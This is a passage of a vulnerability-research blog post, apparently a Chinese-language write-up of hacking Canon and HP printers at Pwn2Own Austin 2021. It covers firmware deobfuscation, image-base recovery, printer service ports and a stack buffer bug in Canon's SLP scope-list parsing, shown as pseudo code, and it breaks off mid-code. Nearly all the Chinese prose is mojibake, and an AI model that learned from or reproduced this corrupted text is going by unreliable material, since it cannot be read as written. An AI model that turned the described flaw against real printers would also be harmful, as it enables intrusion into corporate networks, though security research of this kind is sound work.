&lt;p&gt;ç›®å‰å¸‚é¢ä¸Šçš„å°è¡¨æ©Ÿé è¨­éƒ½é–‹äº†éå¸¸å¤šçš„æœå‹™ï¼Œä¸å¤–ä¹å°±æ˜¯ç‚ºäº†è®“åˆ—å°æ›´åŠ æ–¹ä¾¿ï¼Œåƒæ˜¯ FTPã€AirPrintã€Bonjour ç­‰ç­‰æœå‹™ã€‚&lt;/p&gt;

&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;

&lt;h3 id=&quot;ç‚ºä½•è¦ç ”ç©¶å°è¡¨æ©Ÿå‘¢&quot;&gt;ç‚ºä½•è¦ç ”ç©¶å°è¡¨æ©Ÿå‘¢ï¼Ÿ&lt;/h3&gt;

&lt;h4 id=&quot;ç´…éšŠå…§ç¶²éœ€æ±‚&quot;&gt;ç´…éšŠå…§ç¶²éœ€æ±‚&lt;/h4&gt;
&lt;p&gt;éå»æˆ‘å€‘åœ˜éšŠåœ¨åŸ·è¡Œç´…éšŠæ¼”ç·´éç¨‹ä¸­ï¼Œå°è¡¨æ©Ÿæ™®éå‡ºç¾æ–¼ç¾ä»£ä¼æ¥­å…§ç¶²ä¸­ï¼Œå¹¾ä¹éƒ½æœƒæœ‰ä¸€å°ä»¥ä¸Šï¼Œä½†å¾€å¾€æ˜¯è¢«å¿½ç•¥çš„ä¸€å¡Šï¼Œä¹Ÿå¸¸å¸¸æ²’åœ¨æ›´æ–°ã€‚å°è¡¨æ©Ÿæœ¬èº«ä¹Ÿéå¸¸é©åˆä½œç‚ºæ”»æ“Šè€…çš„è—èº«è™•ï¼Œé€šå¸¸å¾ˆé›£è¢«åµæ¸¬å‡ºä¾†ã€‚å€¼å¾—ä¸€æçš„æ˜¯æ¯”è¼ƒå¤§å‹çš„ä¼æ¥­ä¹Ÿå¾ˆæœ‰å¯èƒ½å°‡å…¶æ¥ä¸Š ADï¼Œæˆç‚ºç²å–æ©Ÿå¯†è³‡è¨Šçš„å…¥å£ã€‚&lt;/p&gt;

&lt;h4 id=&quot;pwn2own-austin-2021&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;å¦å¤–ä¸€é»æ˜¯å°è¡¨æ©Ÿåœ¨ 2021 æ™‚ï¼Œé¦–æ¬¡æˆç‚ºäº† Pwn2Own Mobile ä¸»è¦æ¨å‹•çš„ç›®æ¨™ä¹‹ä¸€ï¼Œè€Œæˆ‘å€‘å‰›å¥½ç•¶æ™‚ä¹Ÿæº–å‚™å†æ¬¡æŒ‘æˆ° Pwn2Own èˆå°ï¼Œä¾¿æ±ºå®šä¸€æ¢ç©¶ç«Ÿã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;èµ·åˆæˆ‘å€‘åŸæœ¬ä»¥ç‚ºéå¸¸ç°¡å–®ï¼Œè·Ÿå¤šæ•¸çš„ IoT è¨­å‚™ä¸€æ¨£ï¼Œèƒ½è¼•æ˜“çš„æ‰¾åˆ° Command injection å•é¡Œï¼Œæ®Šä¸çŸ¥æœ‰ä¸å°‘å°è¡¨æ©Ÿéƒ½æ˜¯ä½¿ç”¨ RTOSï¼Œä¸¦éä¸€èˆ¬çš„ Linux ç³»çµ±ï¼Œä½†é€™æ›´æ˜¯é©…å‹•äº†æˆ‘å€‘æŒ‘æˆ°å®ƒçš„æ±ºå¿ƒã€‚&lt;/p&gt;

&lt;p&gt;æœ¬ç¯‡å°‡æœƒè‘—é‡åœ¨è¼ƒç‚ºç²¾å½©çš„ Canon åŠ HP éƒ¨åˆ†ï¼ŒLexmark æœ‰æ©Ÿæœƒå†è«‡è«‡ã€‚&lt;/p&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
&lt;p&gt;å‰›é–‹å§‹ç ”ç©¶çš„æ™‚å€™ï¼Œæˆ‘å€‘åƒè€ƒäº†è¨±å¤š&lt;a href=&quot;https://chdk.fandom.com/wiki/DryOS_PIXMA_Printer_Shell&quot;&gt;è³‡æ–™&lt;/a&gt;éƒ½æ˜¯éœ€è¦æ‹†è§£ç¡¬é«”ä¾†åˆ†æï¼Œæ‰èƒ½ç²å¾— debug consoleï¼Œå†ç”¨ dump memory æ–¹å¼ä¾†ç²å–åŸå§‹çš„ firmwareã€‚ä½†æœ€çµ‚æˆ‘å€‘æ¡ç”¨äº†å…¶ä»–çš„æ–¹å¼ï¼Œä¸¦æ²’æœ‰æ‹†è§£ä»»ä½•ä¸€å°å°è¡¨æ©Ÿã€‚&lt;/p&gt;

&lt;h3 id=&quot;canon&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;firmware-extract&quot;&gt;Firmware Extract&lt;/h4&gt;
&lt;p&gt;åˆå§‹åˆ†æç‰ˆæœ¬ç‚º v6.03ï¼Œæˆ‘å€‘ä¸€é–‹å§‹ä½¿ç”¨ &lt;a href=&quot;https://github.com/ReFirmLabs/binwalk&quot;&gt;binwalk&lt;/a&gt; å»è§£æå®ƒï¼Œä½† firmware æ˜¯ç¶“éæ··æ·†çš„ï¼Œæˆ‘å€‘ä¸¦æ²’è¾¦æ³•ç›´æ¥è§£é–‹ã€‚&lt;/p&gt;

&lt;p&gt;åœ–: ç¶“éæ··æ·†çš„ Canon ImageCLASS MF644Cdw fimware 
&lt;img src=&quot;/assets/img/blog/20231005/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘é€™é‚Šä¹Ÿå˜—è©¦éäº† &lt;a href=&quot;https://www.synacktiv.com/publications/treasure-chest-party-quest-from-doom-to-exploit.html&quot;&gt;TREASURE CHEST PARTY QUEST: FROM DOOM TO EXPLOIT&lt;/a&gt; by Synacktiv åŠ &lt;a href=&quot;https://web.archive.org/web/20220224100459/https://www.contextis.com/en/blog/hacking-canon-pixma-printers-doomed-encryption&quot;&gt;Hacking Canon Pixma PrintersÂ â€“Â Doomed Encryption&lt;/a&gt; by Contextis Research çš„ç ”ç©¶ï¼Œä½†é€™æ¬¡æ˜¯å®Œå…¨ä¸åŒçš„ç³»åˆ—ï¼Œæˆ‘å€‘ç„¡æ³•ä½¿ç”¨åŒæ¨£çš„æ–¹æ³•è§£é–‹æ··æ·†éçš„ firmwareã€‚&lt;/p&gt;

&lt;p&gt;æ–¼æ˜¯æˆ‘å€‘é–‹å§‹åˆ†ææ··æ·†éçš„ firmware æ ¼å¼åŠå…§å®¹ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¤§è‡´ä¸Šå¯ä»¥å¾æ··æ·†éçš„ firmware çœ‹åˆ°ï¼Œæ¯å€‹æ··æ·†éçš„ firmware çš„é–‹é ­éƒ½æœƒæ˜¯ NCFW é€™å€‹ Magicï¼Œä¸¦å¸¶æœ‰è©² firmware å¤§å°ï¼Œè€Œå…¶ä»–éƒ¨åˆ†å‰‡æ˜¯æ··æ·†éçš„è³‡æ–™ã€‚&lt;/p&gt;

&lt;p&gt;æ–¼æ˜¯æˆ‘å€‘é–‹å§‹çŒœæƒ³ï¼Œä¹Ÿè¨±é€™å°å°è¡¨æ©ŸèˆŠç‰ˆæœ¬çš„ firmware æ²’æœ‰æ··æ·†ï¼Œç›´åˆ°æŸä¸€ç‰ˆæ‰é–‹å§‹æ··æ·†ï¼Œå¦‚æœå¯ä»¥æŠ“åˆ°ä¸­ä»‹ç‰ˆæœ¬ï¼Œå¯èƒ½æœ‰æ©Ÿæœƒç²å¾—è§£æ··æ·†çš„æ–¹æ³•ã€‚è€Œé€™å€‹ Magic ä¹Ÿå¯ä»¥è®“æˆ‘å€‘è¾¨åˆ¥æ˜¯ä¸æ˜¯ç¶“éæ··æ·†çš„ã€‚&lt;/p&gt;

&lt;p&gt;ä»¥ä¸‹é€™å€‹ç¶²å€æ˜¯é€éå®˜ç¶²æˆ–æ˜¯æ“·å–å°åŒ…ç²å¾—çš„ firmware ä¸‹è¼‰ç¶²å€&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://pdisp01.c-wss.com/gdl/WWUFORedirectTarget.do?id=MDQwMDAwNDc1MjA1&amp;amp;cmp=Z01&amp;amp;lang=EN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç¶“éåˆ†æå¾Œï¼Œå¯ä»¥æ‹†åˆ†ç‚ºå¤šå€‹éƒ¨åˆ†&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç´„ç•¥å¯ä»¥æ­¸ç´å‡ºä¸‹è¼‰ç¶²å€çš„è¦å‰‡ï¼Œæˆ‘å€‘å¯ä»¥è—‰ç”±é€™å€‹æ–¹æ³•ä¾†è¼‰åˆ°æ‰€æœ‰ç‰ˆæœ¬çš„ firmwareï¼Œç•¶æ™‚æˆ‘å€‘è¼‰åˆ°çš„ç‰ˆæœ¬æœ‰&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;V2.01&lt;/li&gt;
  &lt;li&gt;V4.02&lt;/li&gt;
  &lt;li&gt;V6.03&lt;/li&gt;
  &lt;li&gt;V9.03&lt;/li&gt;
  &lt;li&gt;V10.02&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è€Œ v10.02 æ˜¯å¹¾å‘¨å¾Œæœƒé‡‹å‡ºçš„ç‰ˆæœ¬ï¼Œå¯ä»¥å…ˆå¾é€™é‚Šå„ªå…ˆè¼‰åˆ°ã€‚è¼‰å®Œæ‰€æœ‰ç‰ˆæœ¬å¾Œï¼Œæˆ‘å€‘ç™¼ç¾è©²ç³»åˆ—ç‰ˆæœ¬çš„ firmware éƒ½æ˜¯ç¶“éæ··æ·†çš„ï¼Œç„¡æ³•å¾å…ˆå‰ç‰ˆæœ¬ç²å¾—è§£æ··æ·†çš„æ–¹æ³•ã€‚ä½†æˆ‘å€‘å¯ä»¥ä¸‹è¼‰ Canon å…¶ä»–ç³»åˆ—çš„å°è¡¨æ©Ÿï¼Œå˜—è©¦æ‰¾æ‰¾æ˜¯å¦æœ‰é¡ä¼¼çš„æ··æ·†æ¼”ç®—æ³•ã€‚è¼‰å®Œç´„æœ‰ 130 GB å¤§å°ã€‚é€é grep æ‰¾ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NCFW&lt;/code&gt; åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;servicemode.html&lt;/code&gt; å¯ä»¥æ‰¾åˆ°æœªæ··æ·†çš„ firmwareã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æœ€å¾Œæ‰¾åˆ°å››çµ„ç¬¦åˆæ¢ä»¶çš„ firmwareï¼Œæˆ‘å€‘é€™é‚Šé¸æ“‡äº† WG7000 ç³»åˆ—çš„å°è¡¨æ©Ÿä¾†åˆ†æï¼Œä¸¦æ‰¾åˆ°äº†ç–‘ä¼¼è§£æ··æ·†çš„å‡½å¼ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¾ˆå¹¸é‹çš„ï¼Œè—‰ç”±é‡å¯«é€™å€‹å‡½å¼ï¼Œå¯ä»¥è§£å‡ºæ˜æ–‡çš„ MF644Cdw firmwareã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨è§£å‡º firmware ä¹‹å¾Œï¼Œå¿…é ˆæ‰¾å‡º firmware çš„ image base addressï¼ŒIDA æ‰èƒ½æœ‰æ•ˆåœ°è¾¨åˆ¥è·Ÿ referenceã€‚æ­¤è™•å¯é€éå¸¸è¦‹çš„åˆ†æå·¥å…· &lt;a href=&quot;https://github.com/sgayou/rbasefind&quot;&gt;rbasefind&lt;/a&gt; ä¾†æ‰¾ image baseã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¸€é–‹å§‹æ‰¾å‡ºçš„ base ç‚º 0x40b0000ï¼Œä½†ä¸Ÿé€² IDA å¾Œï¼Œå»ç™¼ç¾å¤§éƒ¨åˆ†çš„&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;å‡½å¼&lt;/code&gt;èˆ‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug message&lt;/code&gt; çš„å­—ä¸²å°æ˜ ä¸èµ·ä¾†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦‚ä¸Šåœ–æ‰€ç¤ºï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loc_4489AC08&lt;/code&gt; æ‡‰è©²æŒ‡å‘å‡½å¼åç¨±çš„å­—ä¸²ï¼Œç„¶è€Œæ­¤åœ°å€å»ä¸æ˜¯æ­£å¸¸çš„å­—ä¸²ï¼Œè€Œæ˜¯è¢«ç•¶æˆ code å€æ®µï¼Œå…§å®¹ä¹Ÿä¸æ˜¯å­—ä¸²ï¼Œè¡¨ç¤ºæ­¤ä½ç½®ä¸¦éçœŸæ­£ä½ç½®ï¼Œè€Œæ˜¯æœ‰äº›è¨±çš„åç§»ï¼Œä½†æ­£å¸¸ function çš„è§£ææ²’ç”šéº¼å¤ªå¤§å•é¡Œã€‚é€™é‚Šå¯ä»¥å…ˆæ‰¾ä¸€å€‹&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;å·²çŸ¥å‡½å¼åç¨±çš„å‡½å¼&lt;/code&gt;å’Œæ‰¾åˆ°å±¬æ–¼ä»–çš„&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;å‡½å¼åç¨±å­—ä¸²&lt;/code&gt;ä¾†åšèª¿æ•´ï¼Œæ‰¾åˆ°å…¶ä¸­å·®ç•°çš„ offset å¾Œï¼Œå°‡ image base èª¿åˆ°æ­£ç¢ºä½ç½®å°±å¯ä»¥äº†ã€‚æœ€çµ‚æ‰¾åˆ°çš„ image base ç‚º &lt;strong&gt;0x40affde0&lt;/strong&gt;ã€‚èª¿æ•´å®Œå¾Œï¼Œå¯çœ‹åˆ°åŸæœ¬çš„å‡½å¼å·²å¯æ­£ç¢ºè­˜åˆ¥å‡½å¼åç¨±ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹ä¾†å°±å¯ä»¥æ­£å¸¸åˆ†æ firmwareï¼Œè€Œåˆæ­¥åˆ†æå¾Œå¯å¾—çŸ¥ï¼ŒCanon ImageCLASS MF644Cdw æ¶æ§‹å¦‚ä¸‹&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OS - DryOSV2
    &lt;ul&gt;
      &lt;li&gt;Customized RTOS by Canon&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ARMv7 32bit little-endian&lt;/li&gt;
  &lt;li&gt;Linked with application code into single image
    &lt;ul&gt;
      &lt;li&gt;Kernel&lt;/li&gt;
      &lt;li&gt;Service&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;hp&quot;&gt;HP&lt;/h3&gt;

&lt;p&gt;HP çš„ firmware å–å¾—ç›¸å°å®¹æ˜“è¨±å¤šï¼Œæˆ‘å€‘å¯ä»¥é€é &lt;a href=&quot;https://github.com/fkie-cad/fact_extractor/issues/37&quot;&gt;binwalk -Z&lt;/a&gt; ä¾†ç²å¾—æ­£ç¢ºçš„ firmwareï¼Œç´„ç•¥éœ€è¦èŠ± 3-4 å¤©å·¦å³çš„æ™‚é–“ï¼Œè€Œå…¶ä»–æ‰¾ image base address ç­‰æ­¥é©Ÿï¼Œå‰‡èˆ‡ Canon ç›¸åŒï¼Œæ­¤è™•å°±ä¸è´…è¿°ã€‚ç¶“éåˆæ­¥åˆ†æå¾Œï¼ŒHP Color LaserJet Pro MFP M283fdw æ¶æ§‹å¦‚ä¸‹&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OS
    &lt;ul&gt;
      &lt;li&gt;RTOS - Modify from ThreadX/Green Hills&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ARM11 Mixed-endian
    &lt;ul&gt;
      &lt;li&gt;Code - little-endian&lt;/li&gt;
      &lt;li&gt;Data - Big-endian&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;attack-surface&quot;&gt;Attack Surface&lt;/h2&gt;
&lt;p&gt;åœ¨ç¾ä»Šå¸‚é¢ä¸Šå¤§å¤šæ•¸çš„å¤šåŠŸèƒ½äº‹å‹™æ©Ÿä¸­ï¼Œé è¨­éƒ½æœƒé–‹å•Ÿä¸€å †æœå‹™&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;RUI&lt;/td&gt;
      &lt;td&gt;TCP 80/443&lt;/td&gt;
      &lt;td&gt;Web interface&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PDL&lt;/td&gt;
      &lt;td&gt;TCP 9100&lt;/td&gt;
      &lt;td&gt;Page Description Language&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PJL&lt;/td&gt;
      &lt;td&gt;TCP 9100&lt;/td&gt;
      &lt;td&gt;Printer Job Language&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;IPP&lt;/td&gt;
      &lt;td&gt;TCP 631&lt;/td&gt;
      &lt;td&gt;Internet Printing Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;LPD&lt;/td&gt;
      &lt;td&gt;TCP 515&lt;/td&gt;
      &lt;td&gt;Line Printer Daemon Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SNMP&lt;/td&gt;
      &lt;td&gt;UDP 161&lt;/td&gt;
      &lt;td&gt;Simple Network Management Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SLP&lt;/td&gt;
      &lt;td&gt;TCP 427&lt;/td&gt;
      &lt;td&gt;Service Location Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;mDNS&lt;/td&gt;
      &lt;td&gt;UDP 5353&lt;/td&gt;
      &lt;td&gt;Multicast DNS&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;LLMNR&lt;/td&gt;
      &lt;td&gt;UDP 5355&lt;/td&gt;
      &lt;td&gt;Link-Local Multicast Name Resolution&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€¦&lt;/td&gt;
      &lt;td&gt;â€¦&lt;/td&gt;
      &lt;td&gt;â€¦&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ä¸€èˆ¬ä¾†èªªï¼Œç‚ºäº†æ–¹ä¾¿ç®¡ç†ï¼Œé€šå¸¸éƒ½æœƒé–‹ RUI (web ä»‹é¢) ï¼Œå†ä¾†æ˜¯ 9100 Port ä¹Ÿæ˜¯å°è¡¨æ©Ÿå¸¸ä½¿ç”¨çš„ Portï¼Œä¸»è¦æœƒç”¨ä¾†å‚³è¼¸åˆ—å°çš„è³‡æ–™ã€‚å…¶ä»–éƒ¨åˆ†å‰‡æœƒä¾ç…§å» å•†ä¸åŒè€Œæœ‰æ‰€ä¸åŒï¼Œä¸éä¸Šè¿°æ‰€åˆ—çš„æœå‹™é€šå¸¸éƒ½æœƒæœ‰ï¼Œä¸”é è¨­å¤§éƒ¨åˆ†éƒ½æ˜¯é–‹å•Ÿçš„ã€‚åœ¨è©•ä¼°éé€™äº›æœå‹™å¾Œï¼Œæ±ºå®šæ³¨é‡åœ¨ç™¼ç¾æœå‹™åŠ DNS ç³»åˆ—çš„å”å®šï¼Œå› ç‚ºæˆ‘å€‘çš„é•·æœŸç¶“é©—ä¸‹ä¾†ï¼Œå¸¸å¸¸è§€å¯Ÿåˆ° vendor åœ¨é–‹ç™¼é€™äº›æœå‹™æ™‚ï¼Œå¾€å¾€æ˜¯è‡ªè¡Œé–‹ç™¼å¯¦ä½œï¼Œè€Œä¸æ˜¯ä½¿ç”¨å­˜åœ¨å·²ä¹…çš„ Open Sourceã€‚ä½†å¯¦éš›ä¸Šä¾†èªªï¼Œå¯¦ä½œé€™äº›å”å®šå¾ˆå®¹æ˜“å‡ºç¾å•é¡Œçš„ã€‚æˆ‘å€‘ç•¶æ™‚ä¸»è¦åˆ†æçš„æœå‹™ä¸»è¦æœ‰ &lt;strong&gt;SLP&lt;/strong&gt;ã€&lt;strong&gt;mDNS&lt;/strong&gt; åŠ &lt;strong&gt;LLMNR&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹ä¾†å°±ä»¥ Pwn2Own Austin 2021 ä½œç‚º Case Studyï¼Œä¾†çœ‹çœ‹é€™äº›å”å®šå¸¸æœƒæœ‰å“ªäº›å•é¡Œã€‚&lt;/p&gt;

&lt;h2 id=&quot;hacking-printers-at-pwn2own&quot;&gt;Hacking printers at Pwn2Own&lt;/h2&gt;

&lt;h3 id=&quot;canon-1&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;service-location-protocol&quot;&gt;Service Location Protocol&lt;/h4&gt;
&lt;p&gt;SLP æ˜¯ä¸€ç¨®æœå‹™ç™¼ç¾å”å®šï¼Œä¸»è¦ç”¨æ–¼è®“é›»è…¦å¿«é€Ÿæ‰¾åˆ°å°è¡¨æ©Ÿï¼Œéå»åœ¨ ESXI ä¸­ï¼Œ&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/3/1/cve-2020-3992-amp-cve-2021-21974-pre-auth-remote-code-execution-in-vmware-esxi&quot;&gt;SLP ä¹Ÿå¸¸å¸¸å‡ºå•é¡Œ&lt;/a&gt;ï¼Œè€Œåœ¨ Canon çš„ SLP æœå‹™ï¼Œä¸»è¦ç”± Canon è‡ªå·±å¯¦ä½œï¼ŒSLP æœå‹™ç´°ç¯€å¯åƒè€ƒ &lt;a href=&quot;https://www.ietf.org/rfc/rfc2608.txt&quot;&gt;RFC2608&lt;/a&gt;ã€‚åœ¨æˆ‘å€‘åˆ†æ SLP å‰å¿…é ˆå…ˆäº†è§£ SLP å°åŒ…å¤§è‡´ä¸Šçš„çµæ§‹&lt;/p&gt;

&lt;p&gt;åœ–: SLP Packet Structure
&lt;img src=&quot;/assets/img/blog/20231005/12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™é‚Šåªéœ€è¦é—œæ³¨&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function-id&lt;/code&gt;ï¼Œæ­¤æ¬„ä½æœƒæ±ºå®šè«‹æ±‚å‹æ…‹ï¼Œä¹Ÿæœƒæ±ºå®š payload éƒ¨åˆ†çš„æ ¼å¼ã€‚è€Œ Canon åªæœ‰å¯¦ä½œ Service Request åŠ Attribute Request å…©ç¨®ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ Attribute Request (AttrRqst) çš„è«‹æ±‚ä¸­ï¼Œå…è¨±ä½¿ç”¨è€…å¯ä»¥æ ¹æ“š service åŠ scope ä¾†ç²å¾— attribute listã€‚
scope å¯ä»¥å®šç¾©è¦æ‰¾çš„ç¯„åœï¼Œå¦‚ canon å°è¡¨æ©Ÿã€‚&lt;/p&gt;

&lt;p&gt;Example:
&lt;img src=&quot;/assets/img/blog/20231005/14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œ Attribute request çµæ§‹å¤§è‡´å¦‚ä¸‹&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/15.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¸»è¦æ˜¯é•·åº¦(Length)åŠæ•¸å€¼(Value)çš„çµ„åˆï¼Œé€šå¸¸åœ¨ Parse é€™ç¨®æ ¼å¼ï¼Œå¾ˆå®¹æ˜“å‡ºå•é¡Œï¼Œéœ€è¦ç‰¹åˆ¥æ³¨æ„ï¼Œè€Œå¯¦éš›ä¸Š Canon åœ¨ Parse é€™å€‹çµæ§‹æ™‚å°±å‡ºäº†å•é¡Œã€‚&lt;/p&gt;

&lt;h4 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h4&gt;
&lt;p&gt;Canon åœ¨ parse scope list æ™‚ï¼Œæœƒå°‡è·³è„«å­—å…ƒè½‰æ›æˆ ASCIIï¼Œä¾‹å¦‚ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\41&lt;/code&gt; æœƒè½‰æ›æˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; ï¼Œç„¶è€Œé€™å€‹ç°¡å–®è½‰æ›æœƒæœ‰æ€æ¨£çš„å•é¡Œå‘¢? æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹ Pseudo code&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_scope_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...){&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parse_escape_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;å¦‚ä¸Šé¢ç¨‹å¼ç¢¼æ‰€ç¤ºï¼Œåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_scope_list&lt;/code&gt; ä¸­ï¼Œæœƒå…ˆåˆ†é… 36 bytes çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;destbuf&lt;/code&gt; ä¸¦ä¸”æŒ‡å®šæœ€å¤§å¤§å° 34 åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_escape_char&lt;/code&gt; ä¸­ï¼Œé€™é‚Šæ²’ç”šéº¼å•é¡Œï¼Œè®“æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_escape_char&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_escape_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span 